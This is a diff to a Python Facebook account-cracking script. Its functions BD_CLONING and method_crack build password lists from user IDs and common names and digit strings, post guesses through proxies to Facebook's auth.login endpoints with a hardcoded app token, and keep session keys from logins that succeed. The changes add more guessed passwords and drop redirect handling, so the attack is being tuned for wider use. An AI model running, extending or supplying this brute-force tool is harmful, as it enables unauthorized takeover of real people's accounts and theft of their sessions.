@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','lamiya','506070','708090','203040','112244','sabbir','mababa','020304','@@@###']
             if mtd in ['01','1']:
             	Dipto.submit(method_crack,ids,passlist)
             elif mtd in ['02','2']:
@@ -151,7 +151,7 @@ def method_crack(ids,passlist):
             sex1={'User-Agent': build, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '333'}
             header=random.choice([sex,sex1])
             url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
+            reqx=requests.post(url,data=datax,headers=header,proxies=proxs).json()
             if 'session_key' in reqx:
                 try:
                     uid=reqx['uid']
@@ -207,7 +207,7 @@ def method_crack2(ids,passlist):
             datax={'adid': adid, 'format': 'json', 'device_id': adid, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
             header={'User-Agent': ua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '237'}
             url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
+            reqx=requests.post(url,data=datax,headers=header,proxies=proxs).json()
             #print(response)
             if 'session_key' in reqx:
                 try:
@@ -255,7 +255,7 @@ def method_crack3(ids,passlist):
             datax={'locale': 'en_US', 'format': 'json', 'method': 'auth.login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1'}
             header={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-api.facebook.com', 'User-Agent': uam3, 'priority': 'u=3,i', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'Content-Length': '2126'}
             url='https://b-api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
+            reqx=requests.post(url,data=datax,headers=header,proxies=proxs).json()
             #print(response)
             if 'session_key' in reqx:
                 try:
